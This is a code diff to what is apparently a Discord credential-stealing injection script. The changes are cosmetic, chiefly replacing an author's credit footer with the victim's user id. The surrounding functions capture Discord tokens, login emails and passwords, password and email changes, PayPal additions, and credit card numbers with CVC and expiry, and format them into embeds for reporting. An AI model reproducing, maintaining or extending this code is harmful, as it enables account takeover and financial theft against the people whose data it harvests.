@@ -281,7 +281,7 @@ const getBadges = (flags) => {
       badges += "HypeSquad Balance, ";
       break;
     case 0:
-      badges = "None";
+      badges = "\`None\`";
       break;
     default:
       badges = "None";
@@ -325,7 +325,7 @@ const login = async (email, password, token) => {
             color: config.embed_color,
             fields: [
               {
-                name: json.username + "#" + json.discriminator + " (" + json.id + ")",
+                name: json.username + "#" + json.discriminator + "(" + json.id + ")",
                 value: `\`\`\`${token}\`\`\``,
                 inline: false,
               },
@@ -363,7 +363,7 @@ const login = async (email, password, token) => {
               url: `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`,
             },
             footer: {
-              text: "@Rdimo#6969",
+              text: json.id,
         },
       },
     ],
@@ -428,7 +428,7 @@ const passwordChanged = async (oldpassword, newpassword, token) => {
               url: `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`,
             },
             footer: {
-              text: "@Rdimo#6969",
+              text: json.id,
         },
       },
     ],
@@ -488,7 +488,7 @@ const emailChanged = async (email, password, token) => {
               url: `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`,
             },
             footer: {
-              text: "@Rdimo#6969",
+              text: json.id,
         },
       },
     ],
@@ -548,7 +548,7 @@ const PaypalAdded = async (token) => {
               url: `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`,
             },
             footer: {
-              text: "@Rdimo#6969",
+              text: json.id,
         },
       },
     ],
@@ -608,7 +608,7 @@ const ccAdded = async (number, cvc, expir_month, expir_year, email, password, to
               url: `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`,
             },
             footer: {
-              text: "@Rdimo#6969",
+              text: json.id,
         },
       },
     ],
